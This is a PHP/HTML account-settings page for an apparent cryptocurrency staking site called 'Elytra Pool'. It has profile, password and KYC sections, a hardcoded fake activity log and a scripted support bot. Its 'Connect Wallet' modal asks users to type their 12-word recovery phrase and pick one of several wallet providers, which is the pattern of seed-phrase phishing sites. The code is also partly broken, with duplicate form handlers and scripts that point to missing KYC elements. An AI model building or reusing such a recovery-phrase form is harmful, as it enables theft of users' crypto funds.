<?php
session_start();
include '../config/dbcon.php';

// NO CACHE HEADERS
header("Expires: Tue, 01 Jan 2000 00:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// VALIDATE SESSION
if (!isset($_SESSION['user_id']) || $_SESSION['type'] !== 'free') {
  header("Location: ../index.php?error=Unauthorized access.");
  exit;
}

$userId = $_SESSION['user_id'] ?? null;

if ($userId) {
  $stmt = $conn->prepare("SELECT username FROM users WHERE id = ?");
  $stmt->bind_param("i", $userId);
  $stmt->execute();
  $result = $stmt->get_result();
  $user = $result->fetch_assoc();

  $username = $user ? $user['username'] : 'User';
} else {
  $username = 'Guest';
}

$query = "SELECT first_name, last_name, birthday, username, about_me, email, wallet_address, profile_photo 
          FROM users WHERE id = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("i", $userId);
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();

// Set default values with fallback to 'N/A'
$firstName = $user['first_name'] ?? 'N/A';
$lastName = $user['last_name'] ?? 'N/A';
$birthday = $user['birthday'] ?? '';
$username = $user['username'] ?? 'N/A';
$aboutMe = $user['about_me'] ?? 'N/A';
$email = $user['email'] ?? 'N/A';
$walletAddress = $user['wallet_address'] ?? '';
$profileImg = !empty($user['profile_photo']) ? "../" . $user['profile_photo'] : '../assets/default-avatar.png';
$profileImg .= '?v=' . time(); // Cache buster to avoid browser caching old image
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Elytra Pool | Settings</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
  <link rel="shortcut icon" href="../assets/img/ELYTRA.jpg" type="image/x-icon" />
  <link rel="stylesheet" href="../assets/css/style.css">
  <link rel="stylesheet" href="../assets/css/user.css">
</head>

<body class="min-h-screen bg-[#0D1B2A] text-white font-sans">
  <!-- Navigation -->
  <nav
    class="fixed top-0 left-0 w-full z-50 backdrop-blur-lg bg-white/10 border-b border-white/10 shadow-md transition-all duration-500 ease-in-out">
    <div class="max-w-7xl mx-auto flex justify-between items-center px-6 py-4">
      <!-- Logo -->
      <div class="flex items-center space-x-2">
        <a href="user.php" class="flex items-center">
          <div
            class="w-10 h-10 rounded-full flex items-center justify-center pulse hover:scale-105 transition-transform duration-200">
            <img src="../assets/img/Elytra Logo.png" alt="Elytra Logo"
              class="w-full h-full rounded-full object-cover" />
          </div>
          <span class="text-xl font-bold text-white hover:text-purple-400 transition-colors duration-200">Elytra
            Pool</span>
        </a>
      </div>

      <!-- Desktop Nav Links -->
      <div class="hidden md:flex nav-links space-x-6 items-center" id="nav-links">
        <a href="user.php" class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Home</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
        <a href="staking.php" class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Staking</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
        <a href="leaderboard.php"
          class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Leaderboard</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
        <a href="deposit.php" class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Deposit</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
        <a href="withdraw.php"
          class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Withdraw</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
        <a href="Convert.php" class="relative group transform hover:scale-105 transition-all duration-300 ease-in-out">
          <span class="text-white hover:text-purple-300 transition">Convert</span>
          <span
            class="absolute left-0 -bottom-1 h-0.5 w-0 bg-purple-400 group-hover:w-full transition-all duration-300"></span>
        </a>
      </div>

      <!-- Desktop Profile -->
      <div class="relative hidden md:block">
        <button id="profileBtn" class="focus:outline-none">
          <img src="<?= htmlspecialchars($profileImg) ?>" alt="Profile"
            class="w-10 h-10 rounded-full border-2 border-purple-400 object-cover" />
        </button>
        <div id="profileMenu"
          class="absolute right-0 mt-2 w-40 bg-white rounded-lg shadow-lg text-sm text-black hidden z-50">
          <a href="../config/logout.php" class="block px-4 py-2 hover:bg-gray-100">Logout</a>
        </div>
      </div>

      <!-- Mobile Menu & Profile -->
      <div class="md:hidden flex items-center gap-4">
        <button id="menu-button" aria-label="Toggle navigation">
          <i class="fas fa-bars text-xl text-white"></i>
        </button>
        <div class="relative">
          <button id="mobileProfileBtn" class="focus:outline-none">
            <img src="<?= htmlspecialchars($profileImg) ?>" alt="Profile"
              class="w-10 h-10 rounded-full border-2 border-purple-400 object-cover" />
          </button>
          <div id="mobileProfileMenu"
            class="absolute right-0 mt-2 w-40 bg-white rounded-lg shadow-lg text-sm text-black hidden z-50">
            <a href="settings.php" class="block px-4 py-2 hover:bg-gray-100">Settings</a>
            <a href="../config/logout.php" class="block px-4 py-2 hover:bg-gray-100">Logout</a>
          </div>
        </div>
      </div>
    </div>

    <!-- Mobile Navigation Links -->
    <div id="mobile-menu" class="hidden flex-col mt-4 space-y-2 md:hidden">
      <a href="user.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Home</a>
      <a href="staking.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Staking</a>
      <a href="leaderboard.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Leaderboard</a>
      <a href="deposit.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Deposit</a>
      <a href="withdraw.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Withdraw</a>
      <a href="Convert.php" class="block text-white px-4 py-2 hover:bg-[#1E293B] rounded">Convert</a>
    </div>
  </nav>

  <main class="flex items-center justify-center px-4 pt-28 pb-20">
    <div class="w-full max-w-5xl space-y-16">
      <!-- Settings and Logs will continue in PART 2 -->
      <!-- Updated Account Settings -->
      <section class="bg-[#1B263B] p-8 rounded-2xl shadow-xl border border-gray-700">
        <h2 class="text-3xl font-bold text-purple-400 text-center mb-2">👤 Account Settings</h2>
        <p class="text-sm text-gray-400 text-center mb-10">Manage your personal info, profile, and wallet connection.</p>

        <form class="grid grid-cols-1 md:grid-cols-2 gap-10" method="POST" enctype="multipart/form-data" id="accountForm">
          <!-- Profile Photo and Wallet -->
          <div class="flex flex-col items-center space-y-6">
            <div class="relative group">
              <img src="<?= $profileImg ?>" alt="Profile"
                class="w-40 h-40 rounded-full border-4 border-purple-500 object-cover shadow-lg transition duration-200 group-hover:opacity-70" />
              <label for="profilePhoto"
                class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 text-white font-semibold rounded-full opacity-0 group-hover:opacity-100 cursor-pointer">Change</label>
              <input type="file" id="profilePhoto" name="profilePhoto" class="hidden" />
            </div>
            <p class="text-gray-400 text-sm">Click to upload a new profile photo.</p>
            <button type="button" id="connectWalletBtn"
              class="bg-purple-500 hover:bg-purple-400 text-black font-semibold px-6 py-2 rounded-lg transition"
              data-address="<?= htmlspecialchars($walletAddress) ?>">
              <?= $walletAddress ? 'Wallet Connected' : 'Connect Wallet' ?>
            </button>
          </div>

          <!-- Info Form -->
          <div class="space-y-6">
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label for="firstName" class="text-sm text-gray-300 mb-1 block">First Name</label>
                <input type="text" id="firstName" name="firstName"
                  value="<?= htmlspecialchars($firstName) ?>"
                  class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2" />
              </div>
              <div>
                <label for="lastName" class="text-sm text-gray-300 mb-1 block">Last Name</label>
                <input type="text" id="lastName" name="lastName"
                  value="<?= htmlspecialchars($lastName) ?>"
                  class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2" />
              </div>
            </div>
            <div>
              <label for="birthday" class="text-sm text-gray-300 mb-1 block">Birthday</label>
              <input type="date" id="birthday" name="birthday"
                value="<?= htmlspecialchars($birthday) ?>"
                class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2" />
            </div>
            <div>
              <label for="username" class="text-sm text-gray-300 mb-1 block">Username</label>
              <input type="text" id="username" name="username"
                value="<?= htmlspecialchars($username) ?>"
                class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2" />
            </div>
            <div>
              <label for="bio" class="text-sm text-gray-300 mb-1 block">About Me</label>
              <textarea id="bio" name="aboutMe" rows="3"
                class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2"><?= htmlspecialchars($aboutMe) ?></textarea>
            </div>
            <div>
              <label class="text-sm text-gray-300 mb-1 block">Email</label>
              <input type="email" value="<?= htmlspecialchars($email) ?>" disabled
                class="w-full bg-[#1E293B] border border-gray-600 text-gray-400 rounded-lg px-4 py-2" />
            </div>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <!-- New Password -->
              <div class="relative">
                <label for="newPassword" class="text-sm text-gray-300 mb-1 block">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="••••••••"
                  class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2 pr-10" />
                <button type="button" class="absolute right-3 top-9 text-gray-400" onclick="togglePassword(this, 'newPassword')">
                  <i class="fas fa-eye"></i>
                </button>
              </div>

              <!-- Confirm Password -->
              <div class="relative">
                <label for="confirmPassword" class="text-sm text-gray-300 mb-1 block">Confirm Password</label>
                <input type="password" id="confirmPassword" name="confirmPassword" placeholder="••••••••"
                  class="w-full bg-[#0D1B2A] border border-gray-600 text-white rounded-lg px-4 py-2 pr-10" />
                <button type="button" class="absolute right-3 top-9 text-gray-400" onclick="togglePassword(this, 'confirmPassword')">
                  <i class="fas fa-eye"></i>
                </button>
              </div>
            </div>

            <input type="hidden" name="walletAddress" id="walletAddress" value="<?= htmlspecialchars($walletAddress) ?>" />

            <div>
              <label class="text-sm text-gray-300 mb-1 block">Verification / KYC</label>
              <button type="button" onclick="window.location.href='kyc_verification.php'"
                class="bg-transparent border border-purple-400 text-purple-400 hover:bg-purple-400 hover:text-black font-semibold px-4 py-2 rounded-lg transition">
                Start Verification
              </button>
            </div>
            <div class="text-right pt-4">
              <button type="submit"
                class="bg-purple-500 hover:bg-purple-400 text-black font-semibold py-2 px-8 rounded-lg transition">Save
                Changes</button>
            </div>
          </div>
        </form>
      </section>

      <!-- Activity Logs -->
      <section class="bg-[#1B263B] p-6 rounded-2xl shadow-xl border border-gray-700">
        <h3 class="text-2xl font-bold text-purple-400 mb-4 text-center">📝 Activity Logs</h3>
        <p class="text-sm text-gray-400 text-center mb-6">Your recent actions on the platform</p>
        <div class="overflow-x-auto rounded-lg">
          <table class="min-w-full divide-y divide-gray-700 text-sm text-white">
            <thead class="bg-[#0D1B2A] text-purple-300">
              <tr>
                <th class="py-3 px-4 text-left">Date</th>
                <th class="py-3 px-4 text-left">Action</th>
                <th class="py-3 px-4 text-left">Details</th>
              </tr>
            </thead>
            <tbody class="divide-y divide-gray-800 bg-[#1E293B]">
              <tr>
                <td class="px-4 py-3">2025-06-28 14:32</td>
                <td class="px-4 py-3 text-green-400">Deposit</td>
                <td class="px-4 py-3">₱5,000 added to staking balance</td>
              </tr>
              <tr>
                <td class="px-4 py-3">2025-06-27 09:20</td>
                <td class="px-4 py-3 text-blue-400">Settings Update</td>
                <td class="px-4 py-3">Changed profile picture and wallet address</td>
              </tr>
              <tr>
                <td class="px-4 py-3">2025-06-26 16:11</td>
                <td class="px-4 py-3 text-red-400">Withdraw</td>
                <td class="px-4 py-3">₱2,500 withdrawn to 0x43fa...e12F</td>
              </tr>
              <tr>
                <td class="px-4 py-3">2025-06-25 10:55</td>
                <td class="px-4 py-3 text-purple-400">Convert</td>
                <td class="px-4 py-3">Converted ₱1,000 to ElyCoin</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>
    </div>
  </main>

  <!-- Wallet Modal -->
  <div id="walletModal" class="fixed inset-0 z-50 bg-black bg-opacity-70 flex items-center justify-center hidden">
    <div class="bg-[#1B263B] rounded-2xl shadow-lg p-6 w-full max-w-md border border-purple-500">
      <h2 class="text-xl font-bold text-purple-400 mb-4 text-center">🔐 Connect Wallet</h2>
      <label for="recoveryPhrase" class="text-sm text-white block mb-2">Enter your 12-word recovery phrase:</label>
      <textarea id="recoveryPhrase" rows="3"
        class="w-full rounded-lg bg-[#0D1B2A] text-white border border-gray-600 px-4 py-2 mb-4"
        placeholder="word1 word2 ... word12"></textarea>
      <label for="walletPlatform" class="text-sm text-white block mb-2">Select your wallet provider:</label>
      <select id="walletPlatform"
        class="w-full rounded-lg bg-[#0D1B2A] text-white border border-gray-600 px-4 py-2 mb-6">
        <option>MetaMask</option>
        <option>Trust Wallet</option>
        <option>Coinbase Wallet</option>
        <option>Exodus</option>
        <option>TokenPocket</option>
        <option>BitKeep</option>
        <option>SafePal</option>
        <option>MathWallet</option>
      </select>
      <div class="flex justify-between">
        <button id="cancelWallet" class="text-sm text-gray-400 hover:text-white">Cancel</button>
        <button class="bg-purple-500 hover:bg-purple-400 text-black font-semibold px-6 py-2 rounded-lg">Connect</button>
      </div>
    </div>
  </div>

  <!-- Floating Support Button + Chat -->
  <div class="fixed bottom-6 right-6 z-50 group">
    <button id="supportButton"
      class="flex items-center justify-center w-14 h-14 bg-gradient-to-br from-purple-600 to-indigo-600 rounded-full shadow-lg hover:shadow-purple-500/50 transition duration-300 ease-in-out animate-bounce hover:scale-110">
      <i class="fas fa-headset text-white text-xl"></i>
    </button>

    <!-- Tooltip -->
    <div
      class="absolute bottom-16 right-0 bg-gray-800 text-white text-xs px-3 py-1 rounded-md opacity-0 group-hover:opacity-100 transition-opacity duration-300">
      Customer Support
    </div>
  </div>

  <!-- Chatbox -->
  <div id="chatBox"
    class="fixed bottom-24 right-6 w-80 bg-white border border-gray-300 rounded-lg shadow-lg p-4 hidden flex-col">
    <div class="flex justify-between items-center mb-2">
      <h3 class="text-lg font-semibold text-purple-700">Support Chat</h3>
      <button id="closeChat" class="text-gray-500 hover:text-red-500">&times;</button>
    </div>
    <div id="chatMessages" class="h-64 overflow-y-auto text-sm mb-2 space-y-2">
      <!-- AI messages appear here -->
    </div>
    <input type="text" placeholder="Type your message..."
      class="w-full px-3 py-2 border rounded-md focus:outline-none text-sm text-black" />
  </div>

  <!-- Footer -->
  <footer class="py-12 px-6 border-t border-gray-800">
    <div class="max-w-7xl mx-auto">
      <div class="grid md:grid-cols-4 gap-8 mb-8 text-sm text-gray-400">
        <div>
          <h4 class="font-semibold text-white mb-4">Elytra Pool</h4>
          <p>Secure & Decentralized Staking Platform</p>
        </div>
        <div>
          <h4 class="font-semibold text-white mb-4">Products</h4>
          <ul class="space-y-2">
            <li><a href="#" class="hover:text-white">Staking</a></li>
            <li><a href="#" class="hover:text-white">Assets</a></li>
            <li><a href="#" class="hover:text-white">Leaderboard</a></li>
            <li><a href="#" class="hover:text-white">FAQ</a></li>
          </ul>
        </div>
        <div>
          <h4 class="font-semibold text-white mb-4">Support</h4>
          <ul class="space-y-2">
            <li><a href="#" class="hover:text-white">Help Center</a></li>
            <li><a href="#" class="hover:text-white">Contact</a></li>
            <li><a href="#" class="hover:text-white">Privacy Policy</a></li>
          </ul>
        </div>
        <div>
          <h4 class="font-semibold text-white mb-4">Follow Us</h4>
          <div class="flex space-x-4 text-xl">
            <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-twitter"></i></a>
            <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-telegram"></i></a>
            <a href="#" class="text-gray-400 hover:text-white"><i class="fab fa-discord"></i></a>
          </div>
        </div>
      </div>
      <div class="text-center text-gray-600 text-sm border-t border-gray-800 pt-6">© 2023 - 2025 Elytra Pool. All rights
        reserved.</div>
    </div>
  </footer>

  <!-- Scripts -->
  <script src="https://cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css" />

  <script>
    function togglePassword(btn, inputId) {
      const input = document.getElementById(inputId);
      const icon = btn.querySelector("i");

      if (input.type === "password") {
        input.type = "text";
        icon.classList.remove("fa-eye");
        icon.classList.add("fa-eye-slash");
      } else {
        input.type = "password";
        icon.classList.remove("fa-eye-slash");
        icon.classList.add("fa-eye");
      }
    }

    document.querySelector("#accountForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      const firstName = document.getElementById("firstName").value.trim();
      const lastName = document.getElementById("lastName").value.trim();
      const birthday = document.getElementById("birthday").value;
      const username = document.getElementById("username").value.trim();
      const aboutMe = document.getElementById("bio").value.trim();
      const newPassword = document.getElementById("newPassword").value;
      const confirmPassword = document.getElementById("confirmPassword").value;
      const walletAddress = document.getElementById("connectWalletBtn").dataset.address || '';

      // Password validation
      if (newPassword.length > 0) {
        const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;

        if (!passwordRegex.test(newPassword)) {
          alertify.error("Password must be 8+ chars, include uppercase, number, and special character.");
          return;
        }

        if (newPassword !== confirmPassword) {
          alertify.error("Passwords do not match.");
          return;
        }
      }

      const formData = new FormData();
      formData.append("firstName", firstName);
      formData.append("lastName", lastName);
      formData.append("birthday", birthday);
      formData.append("username", username);
      formData.append("aboutMe", aboutMe);
      formData.append("newPassword", newPassword);
      formData.append("confirmPassword", confirmPassword);
      formData.append("walletAddress", walletAddress);

      const profilePhotoInput = document.getElementById("profilePhoto");
      if (profilePhotoInput.files.length > 0) {
        formData.append("profilePhoto", profilePhotoInput.files[0]);
      }

      try {
        const res = await fetch("../config/update_account.php", {
          method: "POST",
          body: formData,
        });

        if (res.ok) {
          alertify.success("Profile updated successfully!");
        } else if (res.status === 400) {
          alertify.error("Password error.");
        } else if (res.status === 401) {
          alertify.error("Unauthorized access.");
        } else {
          alertify.error("Something went wrong. Try again.");
        }
      } catch (err) {
        alertify.error("Failed to connect to server.");
      }
    });
  </script>

  <script>
    document.querySelector("form").addEventListener("submit", async function(e) {
      e.preventDefault();

      const form = e.target;
      const formData = new FormData();

      formData.append("firstName", document.getElementById("firstName").value);
      formData.append("lastName", document.getElementById("lastName").value);
      formData.append("birthday", document.getElementById("birthday").value);
      formData.append("username", document.getElementById("username").value);
      formData.append("aboutMe", document.getElementById("bio").value);
      formData.append("newPassword", document.getElementById("newPassword").value);
      formData.append("confirmPassword", document.getElementById("confirmPassword").value);
      formData.append("walletAddress", document.getElementById("connectWalletBtn").dataset.address || '');

      const profilePhotoInput = document.getElementById("profilePhoto");
      if (profilePhotoInput.files.length > 0) {
        formData.append("profilePhoto", profilePhotoInput.files[0]);
      }

      const res = await fetch("../config/update_account.php", {
        method: "POST",
        body: formData
      });

      const result = await res.json();
      alert(result.message);
    });
  </script>

  <script>
    const menuBtn = document.getElementById("menu-button");
    const mobileMenu = document.getElementById("mobile-menu");
    const profileBtn = document.getElementById("profileBtn");
    const profileMenu = document.getElementById("profileMenu");
    const mobileProfileBtn = document.getElementById("mobileProfileBtn");
    const mobileProfileMenu = document.getElementById("mobileProfileMenu");
    const connectWalletBtn = document.getElementById("connectWalletBtn");
    const walletModal = document.getElementById("walletModal");
    const cancelWallet = document.getElementById("cancelWallet");

    menuBtn?.addEventListener("click", () => {
      mobileMenu.classList.toggle("hidden");
    });

    profileBtn?.addEventListener("click", (e) => {
      e.stopPropagation();
      profileMenu.classList.toggle("hidden");
    });
    mobileProfileBtn?.addEventListener("click", (e) => {
      e.stopPropagation();
      mobileProfileMenu.classList.toggle("hidden");
    });

    window.addEventListener("click", (e) => {
      if (!profileBtn?.contains(e.target)) profileMenu?.classList.add("hidden");
      if (!mobileProfileBtn?.contains(e.target)) mobileProfileMenu?.classList.add("hidden");
    });

    connectWalletBtn?.addEventListener("click", () => {
      walletModal.classList.remove("hidden");
    });

    cancelWallet?.addEventListener("click", () => {
      walletModal.classList.add("hidden");
    });
  </script>

  <script>
    const supportButton = document.getElementById("supportButton");
    const chatBox = document.getElementById("chatBox");
    const closeChat = document.getElementById("closeChat");
    const chatMessages = document.getElementById("chatMessages");
    const userInput = chatBox.querySelector('input[type="text"]');

    supportButton.addEventListener("click", () => {
      chatBox.classList.remove("hidden");
      showAIIntro();
      userInput.focus();
    });

    closeChat.addEventListener("click", () => {
      chatBox.classList.add("hidden");
      chatMessages.innerHTML = "";
      userInput.value = "";
    });

    function showAIIntro() {
      if (chatMessages.children.length === 0) {
        setTimeout(() => addBotMessage("👋 Hi there! I'm Elytra Support Bot."), 500);
        setTimeout(() => addBotMessage("How can I help you today?"), 1500);
        setTimeout(() => addBotMessage(`
        • 💬 How to start staking?<br>
        • 🔒 Wallet connection issue<br>
        • 📊 View staking rewards<br>
        • 📌 Report a bug
      `), 2500);
      }
    }

    function addBotMessage(message) {
      const msg = document.createElement("div");
      msg.className = "bg-gray-100 text-black p-2 rounded text-sm";
      msg.innerHTML = message;
      chatMessages.appendChild(msg);
      chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    function addUserMessage(message) {
      const msg = document.createElement("div");
      msg.className = "bg-purple-200 text-black p-2 rounded text-sm text-right";
      msg.textContent = message;
      chatMessages.appendChild(msg);
      chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // Handle Enter key to send message
    userInput.addEventListener("keypress", function(e) {
      if (e.key === "Enter" && userInput.value.trim() !== "") {
        const message = userInput.value.trim();
        addUserMessage(message);
        userInput.value = "";

        // Simulated bot reply
        setTimeout(() => {
          addBotMessage("🤖 Got it! One of our team will get back to you soon.");
        }, 1000);
      }
    });
  </script>

  <script>
    const openBtn = document.getElementById('openKycModal');
    const closeBtn = document.getElementById('closeKycModal');
    const modal = document.getElementById('kycDocumentModal');

    openBtn.addEventListener('click', () => {
      modal.classList.remove('hidden');
    });

    closeBtn.addEventListener('click', () => {
      modal.classList.add('hidden');
    });

    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.add('hidden');
      }
    });
  </script>

  <script>
    const idOptions = {
      "PH": ["Passport", "Driver's License", "SSS ID", "UMID", "National ID", "Voter's ID"],
      "US": ["Passport", "Driver's License", "State ID", "Social Security Card", "Military ID"],
      "CA": ["Passport", "Driver's License", "Health Card", "Permanent Resident Card"],
      "AU": ["Passport", "Driver's License", "Medicare Card", "Proof of Age Card"],
      "IN": ["Passport", "Aadhar Card", "Voter ID", "Driving License"],
      "GB": ["Passport", "Driving Licence", "National Insurance Card"],
      "DE": ["Passport", "Personalausweis", "Führerschein"],
      "FR": ["Passport", "Carte Nationale d'Identité", "Permis de Conduire"],
      "BR": ["CPF", "RG", "CNH", "Passport"],
      "ZA": ["Passport", "ID Book", "Driver's License"],
      "DEFAULT": ["Passport", "Driver's License", "National ID"]
    };

    const countrySelect = document.getElementById('kycCountry');
    const idTypeSelect = document.getElementById('kycIdType');

    countrySelect.addEventListener('change', function() {
      const selectedCountry = this.value;
      const ids = idOptions[selectedCountry] || idOptions["DEFAULT"];

      // Clear current options
      idTypeSelect.innerHTML = '<option value="">-- Select ID Type --</option>';

      // Populate new options
      ids.forEach(id => {
        const option = document.createElement('option');
        option.value = id;
        option.textContent = id;
        idTypeSelect.appendChild(option);
      });
    });
  </script>


</body>

</html>